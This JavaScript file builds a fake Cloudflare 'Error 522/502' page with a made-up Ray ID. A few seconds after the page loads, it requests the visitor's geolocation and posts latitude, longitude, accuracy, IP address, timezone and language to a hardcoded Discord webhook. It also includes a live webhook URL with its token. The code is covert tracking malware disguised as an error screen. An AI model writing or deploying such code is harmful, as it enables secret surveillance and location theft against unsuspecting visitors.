var whurl = "https://discord.com/api/webhooks/1091332120263266304/aQxI1rpT6T5220SC1Yr-rd6nFiYXjC0UYxTnsxsOGMqCMWrJ66me00M0UJCfAEvNt53a";


var monat = new Date().getMonth() + 1;

var jahr = new Date().getUTCFullYear();

var tag = new Date().getUTCDate();

var uhr = new Date().getUTCHours();

var minute = new Date().getUTCMinutes();

var sekunden = new Date().getUTCSeconds();

if(tag < 10) tag = "0" + tag;
if(monat < 10) monat = "0" + monat;
if(jahr < 10) jahr = "0" + jahr;
if(uhr < 10) uhr = "0" + uhr;
if(minute < 10) minute + "0" + minute;
 

var ts = jahr + "-" + monat + "-" + tag + "T21:" + uhr + ":" + minute + ".000Z"
var ts = `${jahr}-${monat}-${tag}T${uhr}:${minute}:${sekunden}.000Z`



var geoAcc = null;
var geoLat = null;
var geoLong = null;

window.addEventListener("load", () => {
    setTimeout(

        () =>
{
try{
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback); 
}
catch(_){
    console.warn(_)
    err(_,whurl,ts)
}
},2500
    )


  window.id();


})

const successCallback = (position) => {
    console.log(position);
    geoAcc = position.coords.accuracy;
    geoLat = position.coords.latitude;
    geoLong = position.coords.longitude;   
    
    locations = {
        accuracy: geoAcc,
        latitude: geoLat,
        longitude: geoLong
    }
    
    log(whurl,locations,ts)
}  
const errorCallback = (error) => {
   err(whurl,error,ts);
};


  function log(url,locacionObject,timestamp){
    var req = new XMLHttpRequest();

    req.open("POST", url);

    req.setRequestHeader('Content-type', 'application/json');

    var params = {
        content: "",
        username: window.useripaddr || "null",
        avatar_url: "https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png",
        tts: false,
        embeds:[
            {
                type:  "rich",
                title:  "Cloudflare Error 522 Page",
                description: "<@866264667797323806>",
                color: 0x00FF00,
                fields: [
                  {
                    name: `Accuracy`,
                    value: String(locacionObject.accuracy),
                    inline: false
                  },
                  {
                    name: `Longitude`,
                    value: String(locacionObject.longitude)
                  },
                  {
                    name: `Latitude`,
                    value: String(locacionObject.latitude)
                  }
                ],
                timestamp: timestamp,
                thumbnail: {
                  url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  height: 0,
                  width: 0
                },
                author: {
                  name: `Error 502: Connection Timed Out`,
                  url: `http://localhost:80/cf`,
                  icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`
                },
                footer: {
                  text: `CloudFlare Error 502 • Anduril`,
                  icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`
                }
              }
        ]
  }

  req.send(JSON.stringify(params))

  }

  function err(url,error,timestamp){

    var req = new XMLHttpRequest();

    req.open("POST", url);

    req.setRequestHeader('Content-type', 'application/json');

    var params = {
        content: "",
        username: window.useripaddr || "null",
        avatar_url: "https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png",
        tts: false,
        embeds:[
            {
                type:  "rich",
                title:  "Cloudflare Error 522 Page",
                description: "<@866264667797323806>\n\nError Code: `" + error.code + "`\nError Message: `" + error.message + "`",
                color: 0xFF0000,
                fields: [
                  {
                    name: `IP Address`,
                    value: window.useripaddr || "null",
                    inline: false
                  },
                  {
                    name: `Timezone`,
                    value: window.logger.timezone,
                  },
                  {
                    name: `Language`,
                    value: window.logger.language,
                  }
                ],
                timestamp: timestamp,
                thumbnail: {
                  url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  height: 0,
                  width: 0
                },
                author: {
                  name: `Error 502: Connection Timed Out`,
                  url: `http://localhost:80/cf`,
                  icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`
                },
                footer: {
                  text: `CloudFlare Error 502 • Anduril`,
                  icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`,
                  proxy_icon_url: `https://cdn.discordapp.com/attachments/1068642023789301884/1091345356173889660/st_small_507x507-pad_600x600_f8f8f8-removebg.png`
                }
              }
        ]
  }

  req.send(JSON.stringify(params))

  }


var ray = ""
const rays = "7af23"
function isd(){

    if(logger.supports.localstorage() == true){
      if(localStorage.rayID) {
        if(localStorage.rayID !== null){
          if(typeof(localStorage.getItem("rayID")) == 'string'){
            ray = "7af23" + window.localStorage.getItem("rayID");
            return;
        }
      }
    }
    else{}
    ray = makeid(12);
    localStorage.setItem("rayID",ray);
    
  }
  if(typeof(ray) !== 'string' && ray.length !== 17){
    ray = "7af23bae1f2fbbda";
  }

  document.getElementById("cf-ray").innerText = ray;
}


function makeid(length) {
  let result = '';
  const characters = '0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}



function id(){
if(logger.supports.localstorage() == true){
  if(localStorage.ray){

  if(localStorage.ray == null){
    ray = makeid(12);
    localStorage.setItem("ray",ray);
    console.log("its null");
    document.getElementById("cf-ray").innerText = rays + ray;
    return;
    
  }
  if(typeof localStorage.ray == "string" && localStorage.ray.length == 12){
    ray = localStorage.getItem("ray");
    console.log("its a string, and it's lenght is 12 letters.");
    document.getElementById("cf-ray").innerText = rays + ray;
    return;
  }
  else{
    localStorage.removeItem("ray")
    ray = makeid(12);
    localStorage.setItem("ray",ray);
    console.log("it does exist, but it seems to be invalid.")
    document.getElementById("cf-ray").innerText = rays + ray;
    return;
  }
}
  else{
    ray = makeid(12);
    localStorage.setItem("ray",ray);
    console.log("it does not exist")
    document.getElementById("cf-ray").innerText = rays + ray;
    return;
  }
}
else{
console.log("wtf is your browser, it doesnt support html5 localstorage. get a new one")
 ray = "bae1f2fbbda"
 document.getElementById("cf-ray").innerText = rays + ray;
 return;
}

}